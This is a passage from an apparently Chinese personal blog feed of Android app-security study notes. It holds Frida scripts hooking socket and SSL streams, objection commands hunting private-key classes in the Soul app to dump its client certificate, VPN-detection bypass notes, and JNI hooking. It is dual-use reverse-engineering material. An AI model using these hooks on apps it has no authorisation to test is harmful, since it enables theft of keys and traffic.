class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hook_socket</span>(<span class="hljs-params"></span>)</span>&#123;<br>    Java.perform(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;hook_socket;&quot;</span>)<br><br>        <span class="hljs-comment">// Java.use(&quot;java.net.SocketOutputStream&quot;).write.overload(&#x27;[B&#x27;, &#x27;int&#x27;, &#x27;int&#x27;).implementation = function(bytearry,int1,int2)&#123;</span><br>        <span class="hljs-comment">//     var result = this.write(bytearry,int1,int2);</span><br>        <span class="hljs-comment">//     console.log(&quot;HTTP write result,bytearry,int1,int2=&gt;&quot;,result,bytearry,int1,int2)</span><br>        <span class="hljs-comment">//     var ByteString = Java.use(&quot;com.android.okhttp.okio.ByteString&quot;);</span><br>        <span class="hljs-comment">//     //console.log(&quot;bytearray contents=&gt;&quot;, ByteString.of(bytearry).hex())</span><br>        <span class="hljs-comment">//     //console.log(jhexdump(bytearry,int1,int2));</span><br>        <span class="hljs-comment">//     // console.log(jhexdump(bytearry));</span><br>            <br>        <span class="hljs-comment">//     console.log(this.socket.value.getLocalAddress().toString())</span><br>        <span class="hljs-comment">//     console.log(this.socket.value.getLocalPort())</span><br>        <span class="hljs-comment">//     console.log(this.socket.value.getRemoteSocketAddress().toString())</span><br>        <span class="hljs-comment">//     console.log(this.socket.value.getPort())</span><br>            <br>        <span class="hljs-comment">//     return result;</span><br>        <span class="hljs-comment">// &#125;</span><br>        <br><br>        Java.use(<span class="hljs-string">&quot;java.net.SocketInputStream&quot;</span>).read.overload(<span class="hljs-string">&#x27;[B&#x27;</span>, <span class="hljs-string">&#x27;int&#x27;</span>, <span class="hljs-string">&#x27;int&#x27;</span>).implementation = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">bytearry,int1,int2</span>)</span>&#123;<br>            <span class="hljs-keyword">var</span> result = <span class="hljs-built_in">this</span>.read(bytearry,int1,int2);<br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;HTTP read result,bytearry,int1,int2=&gt;&quot;</span>,result,bytearry,int1,int2)<br>            <span class="hljs-keyword">var</span> ByteString = Java.use(<span class="hljs-string">&quot;com.android.okhttp.okio.ByteString&quot;</span>);<br>            <span class="hljs-comment">//console.log(&quot;bytearray contents=&gt;&quot;, ByteString.of(bytearry).hex())</span><br>            <span class="hljs-comment">//console.log(jhexdump(bytearry,int1,int2));</span><br>            <span class="hljs-comment">// console.log(jhexdump(bytearry));</span><br><br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-built_in">this</span>.socket.value.getLocalAddress().toString())<br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-built_in">this</span>.socket.value.getLocalPort())<br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-built_in">this</span>.socket.value.getRemoteSocketAddress().toString())<br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-built_in">this</span>.socket.value.getPort())<br><br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-built_in">this</span>.socket.value.getImpl());<br><br><br><br>            <span class="hljs-keyword">return</span> result;<br>        &#125;<br><br>    &#125;)<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="基于hook之网卡和路由器抓包"><a href="#基于hook之网卡和路由器抓包" class="headerlink" title="基于hook之网卡和路由器抓包"></a>基于hook之网卡和路由器抓包</h1><ul><li>手机刷入kali</li><li>手机kali中，直接抓取4G卡流量</li><li>使用VNC viewer，远程连接手机上的Kali Nethunter</li><li>自制路由器，dump所有经过流量，彻底解决抓不到包 </li></ul><h1 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h1><p>1.用Charles抓到登录包：福建农信通</p><p>添加端口。</p><p><img src="/2021/06/01/%E6%8A%93%E5%8C%85%E5%85%A8%E8%A7%A3/image-20210815211557876.png" alt="image-20210815211557876"></p><p>使用VPN抓包。</p><p><img src="/2021/06/01/%E6%8A%93%E5%8C%85%E5%85%A8%E8%A7%A3/image-20210815211523795.png" alt="image-20210815211523795"></p><p>2.用Charles抓到登录包：秀动</p><p>过vpn检测，com.taihebase.activity.utils.SecurityUtil.dealNetSecurityCheck()，课程内容太久远，已经失效了。。。</p><p>3.以soul为例，尝试开发dump其客户端证书的通杀脚本。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">plugin load /root/Desktop/Wallbreaker<br>plugin wallbreaker objectsearch org<span class="hljs-selector-class">.conscrypt</span><span class="hljs-selector-class">.ActiveSession</span><br>android hooking search classes org<span class="hljs-selector-class">.conscrypt</span><span class="hljs-selector-class">.ActiveSession</span><br>plugin wallbreaker objectsearch com<span class="hljs-selector-class">.android</span><span class="hljs-selector-class">.org</span><span class="hljs-selector-class">.conscrypt</span><span class="hljs-selector-class">.ActiveSession</span><br>plugin wallbreaker objectdump --fullname <span class="hljs-number">0</span>x324a<br></code></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hook_SSLsocketandroid8</span>(<span class="hljs-params"></span>)</span>&#123;<br>    Java.perform(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;hook_SSLsocket&quot;</span>)<br>        <br>        Java.use(<span class="hljs-string">&quot;com.android.org.conscrypt.ConscryptFileDescriptorSocket$SSLOutputStream&quot;</span>).write.overload(<span class="hljs-string">&#x27;[B&#x27;</span>, <span class="hljs-string">&#x27;int&#x27;</span>, <span class="hljs-string">&#x27;int&#x27;</span>).implementation = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">bytearry,int1,int2</span>)</span>&#123;<br>            <span class="hljs-keyword">var</span> result = <span class="hljs-built_in">this</span>.write(bytearry,int1,int2);<br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;HTTPS write result,bytearry,int1,int2=&gt;&quot;</span>,result,bytearry,int1,int2)<br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;SSLwrite---peer--&gt;:\n&quot;</span> + <span class="hljs-built_in">this</span>.this$0.value.sslSession.value.peerCertificates.value.toString());<br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;SSLwrite---local--&gt;:\n&quot;</span> + <span class="hljs-built_in">this</span>.this$0.value.sslSession.value.localCertificates.value.toString());<br><br>            <span class="hljs-keyword">return</span> result;<br>        &#125;<br>        <br><br>        <br>        Java.use(<span class="hljs-string">&quot;com.android.org.conscrypt.ConscryptFileDescriptorSocket$SSLInputStream&quot;</span>).read.overload(<span class="hljs-string">&#x27;[B&#x27;</span>, <span class="hljs-string">&#x27;int&#x27;</span>, <span class="hljs-string">&#x27;int&#x27;</span>).implementation = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">bytearry,int1,int2</span>)</span>&#123;<br>            <span class="hljs-keyword">var</span> result = <span class="hljs-built_in">this</span>.read(bytearry,int1,int2);<br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;HTTPS read result,bytearry,int1,int2=&gt;&quot;</span>,result,bytearry,int1,int2);<br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;SSLread---peer--&gt;:\n&quot;</span> + <span class="hljs-built_in">this</span>.this$0.value.sslSession.value.peerCertificates.value.toString());<br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;SSLread---local--&gt;:\n&quot;</span> + <span class="hljs-built_in">this</span>.this$0.value.sslSession.value.localCertificates.value.toString());<br><br>            <span class="hljs-keyword">return</span> result;<br>        &#125;<br>        <br><br>    &#125;)<br>&#125;<br></code></pre></td></tr></table></figure><p>上方代码只能dump出来证书的一部分。</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">android </span>hooking search classes privatekey<br>批量hook<br>objection -g cn.soulapp.<span class="hljs-keyword">android </span>explore -c privatekey.txt<br></code></pre></td></tr></table></figure><p><img src="/2021/06/01/%E6%8A%93%E5%8C%85%E5%85%A8%E8%A7%A3/image-20210816170908009.png" alt="image-20210816170908009"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">不会写脚本，想不通为什么这么辣鸡，只会跟着视频一步一步学，学完了还是什么都不会，怕不是个脑残吧。<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Android</category>
      
      <category>Android应用安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Android安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Frida_hook大全</title>
    <link href="/2021/06/01/Frida-hook%E5%A4%A7%E5%85%A8/"/>
    <url>/2021/06/01/Frida-hook%E5%A4%A7%E5%85%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="框架层hook及Frida和Java语言的互转"><a href="#框架层hook及Frida和Java语言的互转" class="headerlink" title="框架层hook及Frida和Java语言的互转"></a>框架层hook及Frida和Java语言的互转</h1><p><strong>Frida对应的Java语法指南</strong></p><p><strong>Frida与Java共同的一等公民：类</strong></p><p><strong>找到/添加类的几种方法：内存漫游、动态加载、frida加载</strong></p><p><strong>类变量、类方法、实例变量、实例方法、构造方法、hook和主动调用</strong></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">打开dex文件，即可使用其中的类：<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Java</span>.</span></span><span class="hljs-keyword">open</span><span class="hljs-constructor">ClassFile(<span class="hljs-string">&quot;*.dex&quot;</span>)</span>.load<span class="hljs-literal">()</span>;<br>java数组：<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Java</span>.</span></span><span class="hljs-built_in">array</span>(&#x27;<span class="hljs-built_in">int</span>&#x27;, <span class="hljs-literal">[<span class="hljs-number">1</span>, <span class="hljs-number">12</span>,<span class="hljs-number">123</span>]</span>);<br>构造方法：<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Java</span>.</span></span>use(<span class="hljs-string">&quot;java.lang.String&quot;</span>).$init<br><span class="hljs-keyword">new</span>对象：<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Java</span>.</span></span>use(<span class="hljs-string">&quot;java.lang.String&quot;</span>).<span class="hljs-constructor">$<span class="hljs-keyword">new</span>()</span><br></code></pre></td></tr></table></figure><p>objection使用wallbreaker打印类信息：</p><p><img src="/2021/06/01/Frida-hook%E5%A4%A7%E5%85%A8/image-20210601222046197.png" alt="image-20210601222046197"></p><h1 id="组件和事件hook核心原理和案例"><a href="#组件和事件hook核心原理和案例" class="headerlink" title="组件和事件hook核心原理和案例"></a>组件和事件hook核心原理和案例</h1><p><strong>四大组件 Intent</strong></p><p><strong>事件组件 Event</strong></p><p><strong>密码组件 Cipher</strong></p><p><strong>文件组件 File fsmon</strong></p><p>objection命令：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gradle">加载插件启动：objection -g 包名 explore -P ~<span class="hljs-regexp">/.objection/</span>plugins<br>查看日志：cat ~<span class="hljs-regexp">/.objection/</span>objection.log<br>列出activity组件：android hooking list activities<br>运行activity：android intent launch_activity xxxxxxxxxxxx<br>搜索类：android search classes 包名<br>列出方法：android hooking list class_methods 包名<br>监听所有方法：android hooking watch <span class="hljs-keyword">class</span> 包名 <br>hook某个方法：android hooking watch class_method 方法 --<span class="hljs-keyword">dump</span>-args --<span class="hljs-keyword">dump</span>-<span class="hljs-keyword">return</span><br>hook构造函数：android hooking watch class_method java.io.<span class="hljs-keyword">File</span>.$init --<span class="hljs-keyword">dump</span>-args --<span class="hljs-keyword">dump</span>-<span class="hljs-keyword">return</span><br></code></pre></td></tr></table></figure><h1 id="网络层框架组件的拦截思路"><a href="#网络层框架组件的拦截思路" class="headerlink" title="网络层框架组件的拦截思路"></a>网络层框架组件的拦截思路</h1><p><strong>网络组件</strong></p><p><strong>URLHTTPConnection</strong></p><p><strong>okhttp_interceptor</strong></p><p><strong>ssl_logger(native)</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">hook:<br>java<span class="hljs-selector-class">.net</span><span class="hljs-selector-class">.URLConnection</span> --&gt; setDoInput、setDoOutput()、getURL()<br>java<span class="hljs-selector-class">.net</span><span class="hljs-selector-class">.HttpURLConnection</span><br><br></code></pre></td></tr></table></figure><h1 id="Frida反调试思路和hook-native"><a href="#Frida反调试思路和hook-native" class="headerlink" title="Frida反调试思路和hook_native"></a>Frida反调试思路和hook_native</h1><p><strong>Frida反调试与反反调试基本思路（javaAPI，NativeAPI，Syscall）</strong></p><p><strong>Native函数的java hook及主动调用</strong></p><p><strong>静态注册函数参数、返回值打印和替换</strong></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">遍历连接手机所有端口发送“D-bus”消息，返回“REJECT”这个特征则认为存在frida-server。<br>直接调用“openat”的“syscall”的检测在“text”节表中搜索“frida-gadget*.so/frida-agent*.so”字符串，避免hook了libc进行反反调试。<br>内存中存在“frida rpc”字符串，认为有frida-server。<br><br>frida提示，代码补全：npm install --save @types/frida-gum<br><br>objection命令：<br>导出so文件函数列表：memory <span class="hljs-built_in">list</span> exports xxxxx.so<br>显示所有modules：memory <span class="hljs-built_in">list</span> modules<br><br>hook_native:<br>找到要hook的so文件的地址：<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Module</span>.</span></span>find<span class="hljs-constructor">BaseAddress(<span class="hljs-string">&quot;xxx.so&quot;</span>)</span><br>找到要hook的函数地址：<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Module</span>.</span></span>find<span class="hljs-constructor">ExportByName(<span class="hljs-string">&quot;xxx.so&quot;</span>, <span class="hljs-string">&quot;函数名&quot;</span>)</span><br>attach函数：<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Interceptor</span>.</span></span>attach(函数地址,&#123;<br>onEnter:<span class="hljs-keyword">function</span>(args)&#123;<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Java</span>.</span></span>vm.getEnv.get<span class="hljs-constructor">StringUtfChars(<span class="hljs-params">args</span>[2], <span class="hljs-params">null</span>)</span>.read<span class="hljs-constructor">CString()</span>;<br><span class="hljs-comment">//参数替换</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Java</span>.</span></span>vm.get<span class="hljs-constructor">Env()</span>.<span class="hljs-keyword">new</span><span class="hljs-constructor">StringUtf(<span class="hljs-string">&quot;fffffffff&quot;</span>)</span>;<br>args<span class="hljs-literal">[<span class="hljs-number">2</span>]</span> = 新参数;<br>&#125;,onLeave:<span class="hljs-keyword">function</span>(retval)&#123;<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Java</span>.</span></span>vm.getEnv.get<span class="hljs-constructor">StringUtfChars(<span class="hljs-params">retval</span>, <span class="hljs-params">null</span>)</span>.read<span class="hljs-constructor">CString()</span>;<br><span class="hljs-comment">//返回值替换</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Java</span>.</span></span>vm.get<span class="hljs-constructor">Env()</span>.<span class="hljs-keyword">new</span><span class="hljs-constructor">StringUtf(<span class="hljs-string">&quot;fffffffff&quot;</span>)</span>;<br>retval.replace(新返回值);<br>&#125;<br>&#125;)<br></code></pre></td></tr></table></figure><h1 id="hook和主动调用"><a href="#hook和主动调用" class="headerlink" title="hook和主动调用"></a>hook和主动调用</h1><p><strong>调用栈</strong></p><p><strong>主动调动、replace</strong></p><p><strong>符号hook==偏移hook</strong></p><p><strong>枚举并保存结果</strong></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">//主动调用</span><br>var r0add = <span class="hljs-keyword">new</span> <span class="hljs-constructor">NativeFunction(<span class="hljs-params">r0add_addr</span>,<span class="hljs-string">&quot;int&quot;</span>,[<span class="hljs-string">&quot;int&quot;</span>,<span class="hljs-string">&quot;int&quot;</span>])</span>;<br>    var r0add_result = r0add(<span class="hljs-number">50</span>,<span class="hljs-number">1</span>);<br>JNI函数主动调用：<br>var myfirstjniJNI_invoke = <span class="hljs-keyword">new</span> <span class="hljs-constructor">NativeFunction(<span class="hljs-params">myfirstjniJNI</span>,<span class="hljs-string">&quot;pointer&quot;</span>,[<span class="hljs-string">&quot;pointer&quot;</span>,<span class="hljs-string">&quot;pointer&quot;</span>,<span class="hljs-string">&quot;pointer&quot;</span>])</span><br><span class="hljs-comment">//调用栈</span><br> console.log(&#x27;CCCryptorCreate called from:\n&#x27; +<br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Thread</span>.</span></span>backtrace(this.context, Backtracer.FUZZY)<br>        .map(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DebugSymbol</span>.</span></span>fromAddress).join(<span class="hljs-character">&#x27;\n&#x27;</span>) + <span class="hljs-character">&#x27;\n&#x27;</span>);<br><span class="hljs-comment">//替换JNI函数</span><br>var myfirstjniJNI_invoke = <span class="hljs-keyword">new</span> <span class="hljs-constructor">NativeFunction(<span class="hljs-params">myfirstjniJNI</span>,<span class="hljs-string">&quot;pointer&quot;</span>,[<span class="hljs-string">&quot;pointer&quot;</span>,<span class="hljs-string">&quot;pointer&quot;</span>,<span class="hljs-string">&quot;pointer&quot;</span>])</span><br><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Interceptor</span>.</span></span>replace(myfirstjniJNI,<span class="hljs-keyword">new</span> <span class="hljs-constructor">NativeCallback(<span class="hljs-params">function</span>(<span class="hljs-params">args0</span>,<span class="hljs-params">args1</span>,<span class="hljs-params">args2</span>)</span>&#123;<br>        console.log(<span class="hljs-string">&quot;Interceptor.replace myfirstjniJNI args:&quot;</span>,args0,args1,args2);<br>        <span class="hljs-comment">//var result = myfirstjniJNI_invoke(args0,args1,args2)</span><br>        return <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Java</span>.</span></span>vm.get<span class="hljs-constructor">Env()</span>.<span class="hljs-keyword">new</span><span class="hljs-constructor">StringUtf(<span class="hljs-string">&quot;new Retval from frida&quot;</span>)</span>;;<br>    &#125;,<span class="hljs-string">&quot;pointer&quot;</span>,<span class="hljs-literal">[&quot;<span class="hljs-identifier">pointer</span>&quot;,&quot;<span class="hljs-identifier">pointer</span>&quot;,&quot;<span class="hljs-identifier">pointer</span>&quot;]</span>))<br><span class="hljs-comment">//枚举并保存结果</span><br> var modules = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Process</span>.</span></span>enumerate<span class="hljs-constructor">Modules()</span>;<br>    <span class="hljs-comment">//console.log(&quot;Process.enumerateModules =&gt; &quot;,JSON.stringify(modules))</span><br>    <span class="hljs-keyword">for</span>(var i=<span class="hljs-number">0</span>;i&lt;modules.length;i++)&#123;<br>        var <span class="hljs-keyword">module</span> = modules<span class="hljs-literal">[<span class="hljs-identifier">i</span>]</span>;<br>        var module_name = modules<span class="hljs-literal">[<span class="hljs-identifier">i</span>]</span>.name;<br>        var exports = <span class="hljs-keyword">module</span>.enumerate<span class="hljs-constructor">Exports()</span>;<br>        console.log(<span class="hljs-string">&quot;module_name=&gt;&quot;</span>,module_name,<span class="hljs-string">&quot;  module.enumerateExports = &gt; &quot;</span>,<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">JSON</span>.</span></span>stringify(exports))<br>    &#125;<br><span class="hljs-comment">//工具</span><br> DWARF<br></code></pre></td></tr></table></figure><h1 id="ProcessModuleMemoryThread"><a href="#ProcessModuleMemoryThread" class="headerlink" title="ProcessModuleMemoryThread"></a>ProcessModuleMemoryThread</h1><p><strong>Process</strong></p><p><strong>Module</strong></p><p><strong>Memory</strong></p><p><strong>Thread</strong></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">//frida</span>官方API文档<br><span class="hljs-string">//Thread</span><br>用于打印调用栈<br><span class="hljs-string">//Process</span><br>进程号：<span class="hljs-string">.id</span><br>架构：<span class="hljs-string">.arch</span><br>设备系统：<span class="hljs-string">.platform</span><br>是否附加调试：<span class="hljs-string">.isDebuggerAttached</span><br><span class="hljs-string">//Module</span><br>加载module：<span class="hljs-string">.load</span><span class="hljs-params">()</span><br>枚举导入表：enumerateImports<span class="hljs-params">()</span><br><br></code></pre></td></tr></table></figure><h1 id="JNI框架层的hook利用"><a href="#JNI框架层的hook利用" class="headerlink" title="JNI框架层的hook利用"></a>JNI框架层的hook利用</h1><p><strong>JNI函数符号hook</strong></p><p><strong>JNI函数参数、返回值打印和替换</strong></p><p><strong>动态注册JNI_Onload</strong></p><p><strong>hook RegisterNatives</strong></p><p><strong>jnitrace</strong></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">unction hook<span class="hljs-constructor">_JNI()</span>&#123;<br><br>    var GetStringUTFChars_addr = null;<br>    var symbols = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Process</span>.</span></span>find<span class="hljs-constructor">ModuleByName(<span class="hljs-string">&quot;libart.so&quot;</span>)</span>.enumerate<span class="hljs-constructor">Symbols()</span><br>    <span class="hljs-comment">//console.log(JSON.stringify(symbols))</span><br>    <span class="hljs-keyword">for</span>(var i = <span class="hljs-number">0</span>;i&lt;symbols.length;i++)&#123;<br>        var symbol = symbols<span class="hljs-literal">[<span class="hljs-identifier">i</span>]</span>.name;<br>        <span class="hljs-keyword">if</span>((symbol.index<span class="hljs-constructor">Of(<span class="hljs-string">&quot;CheckJNI&quot;</span>)</span>==-<span class="hljs-number">1</span>)&amp;&amp;(symbol.index<span class="hljs-constructor">Of(<span class="hljs-string">&quot;JNI&quot;</span>)</span>&gt;=<span class="hljs-number">0</span>))&#123;<br>            <span class="hljs-keyword">if</span>(symbol.index<span class="hljs-constructor">Of(<span class="hljs-string">&quot;GetStringUTFChars&quot;</span>)</span>&gt;=<span class="hljs-number">0</span>)&#123;<br>                console.log(<span class="hljs-string">&quot;finally found GetStringUTFChars name :&quot;</span>,symbol);<br>                GetStringUTFChars_addr =symbols<span class="hljs-literal">[<span class="hljs-identifier">i</span>]</span>.address ;<br>                console.log(<span class="hljs-string">&quot;finally found GetStringUTFChars address :&quot;</span>,GetStringUTFChars_addr);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Interceptor</span>.</span></span>attach(GetStringUTFChars_addr,&#123;<br>        onEnter:<span class="hljs-keyword">function</span>(args)&#123;<br>            console.log(<span class="hljs-string">&quot;art::JNI::GetStringUTFChars(_JNIEnv*, _jstring*, unsigned char*)=&gt;&quot;</span>,args<span class="hljs-literal">[<span class="hljs-number">0</span>]</span>,<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Java</span>.</span></span>vm.get<span class="hljs-constructor">Env()</span>.get<span class="hljs-constructor">StringUtfChars( <span class="hljs-params">args</span>[1],<span class="hljs-params">null</span>)</span>.read<span class="hljs-constructor">CString()</span>,args<span class="hljs-literal">[<span class="hljs-number">2</span>]</span>);<br>            <span class="hljs-comment">// console.log(&#x27;CCCryptorCreate called from:\n&#x27; +</span><br>            <span class="hljs-comment">// Thread.backtrace(this.context, Backtracer.ACCURATE)</span><br>            <span class="hljs-comment">// .map(DebugSymbol.fromAddress).join(&#x27;\n&#x27;) + &#x27;\n&#x27;);</span><br>        &#125;,onLeave:<span class="hljs-keyword">function</span>(retval)&#123;<br>            console.log(<span class="hljs-string">&quot;retval is =&gt; &quot;</span>,retval.read<span class="hljs-constructor">CString()</span>);<br>        &#125;<br>    